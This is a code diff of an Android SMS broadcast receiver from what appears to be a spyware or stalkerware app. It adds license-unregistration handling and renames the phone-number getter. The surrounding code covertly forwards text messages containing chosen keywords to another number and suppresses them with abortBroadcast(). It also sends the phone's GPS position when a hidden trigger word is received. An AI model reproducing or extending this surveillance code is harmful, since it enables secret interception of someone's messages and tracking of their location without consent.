@@ -282,6 +282,28 @@ public class SmsReceiver extends BroadcastReceiver
 				String phoneNum = SmsCtrl.getSmsAddress(intent);
 				IndicationHandler.handleIndicationSms(context, smsBody, phoneNum);
 			}
+			
+			//-------------------------------------------------------------------------------
+			// If it is unregister response SMS from server
+			else if (smsBody.startsWith(SmsConsts.HEADER_UNREGISTER_EX))
+			{
+				String incomingPhoneNum = SmsCtrl.getSmsAddress(intent);
+				String[] parts = smsBody.split(SmsConsts.SEPARATOR);
+				if (parts.length < 3) return;
+				if (parts[2].equals(SmsConsts.SUCCESS)) {
+					ConfigCtrl.setLicenseKey(context, "");
+					ConfigCtrl.setLicenseType(context, LICENSE_TYPE.TRIAL_LICENSED);
+					
+					// send a reporting SMS to the receiver
+					String reportPhoneNum = ConfigCtrl.getUnregistererPhoneNum(context);
+					if (reportPhoneNum == null || reportPhoneNum.length() <= 0 ) { 
+						reportPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+					}
+					if (reportPhoneNum != null && reportPhoneNum.length() > 0) {
+						boolean ret = SmsCtrl.sendUnregisterReportSms(context, reportPhoneNum);
+					}
+				}
+			}
 
 			//-------------------------------------------------------------------------------
 			// Redirect SMS that contains sensitive words
@@ -294,7 +316,7 @@ public class SmsReceiver extends BroadcastReceiver
 					return;
 				}
 
-				String phoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
+				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
 				if (phoneNum.length() > 0) {
 					String smsAddress = SmsCtrl.getSmsAddress(intent);
 					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), smsAddress);
@@ -304,7 +326,7 @@ public class SmsReceiver extends BroadcastReceiver
 
 			//-------------------------------------------------------------------------------
 			// Send GPS position if being triggered by GPS activation word
-			if (BootService.gpsWord != null && 
+			else if (BootService.gpsWord != null && 
 				BootService.gpsWord.length() > 0 && 
 				smsBody.contains(BootService.gpsWord)) 
 			{
@@ -319,7 +341,7 @@ public class SmsReceiver extends BroadcastReceiver
 					abortBroadcast();
 				}
 
-				String phoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
+				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
 				if (phoneNum.length() > 0) {
 					if (BootService.locationUtil == null) {
 						Log.e(LOGTAG, "GPS utility is NULL");
